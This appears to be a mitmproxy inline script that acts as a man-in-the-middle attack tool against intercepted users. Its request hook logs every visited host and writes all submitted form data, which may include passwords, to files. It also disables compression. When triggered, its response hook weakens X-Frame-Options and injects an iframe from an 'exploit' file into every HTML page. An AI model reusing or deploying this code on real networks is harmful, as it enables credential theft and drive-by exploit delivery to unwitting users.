
import re
import os

def request(ctx, flow):
    """
        Called when a client request has been received.
    """
    ctx.log("request")
    #print "REQUEST:"
    #print flow.request._assemble()
    #print str(flow.request.headers["Host"][0])
    try:
        # no windows update
        #if str(flow.request.headers["Host"][0]).endswith('windowsupdate.com'):
        #  flow.request.host = "127.0.0.1"
        #  flow.request.headers["Host"] = ["127.0.0.1"]

        file = open("data/urls.txt", "a")
        if flow.request.port == 443:
            file.write("HTTPS " + str(flow.request.headers["Host"][0]) + "\n")
        else:
            file.write("http  " + str(flow.request.headers["Host"][0]) + "\n")
        file.close()

        #if 'Accept-Encoding' in flow.request.headers:
        flow.request.headers["Accept-Encoding"] = ['none']

        form = flow.request.get_form_urlencoded()
        if form:
            file = open("data/forms.txt", "a")
            file.write(flow.request.path + "\n")
            file.write(str(form))
            file.close()

    except Exception as ee:
        ctx.log(str(ee))


def response(ctx, flow):
    """
       Called when a server response has been received.
    """
    ctx.log("response")
    #print "RESPONSE:"
    if os.path.exists('inject'):
        try:
            flow.response.headers["X-Frame-Options"] = ['ALLOW-FROM http://10.0.0.1/']
            iframe = open('exploit/iframe.html').read()
            #injected = re.sub("(<body[^>]*>)", "\\1" + iframe, flow.response.content, flags = re.IGNORECASE)
            injected = re.sub("(<\/body>)", iframe + "\\1", flow.response.content, flags = re.IGNORECASE)
            if injected > 0:
                ctx.log('Iframe injected')
                flow.response.content = injected
        except Exception as ee:
            print(str(ee))

def error(ctx, flow):
    """
        Called when a flow error has occured, e.g. invalid server responses, or
        interrupted connections. This is distinct from a valid server HTTP error
        response, which is simply a response with an HTTP error code.
    """
    ctx.log("error")

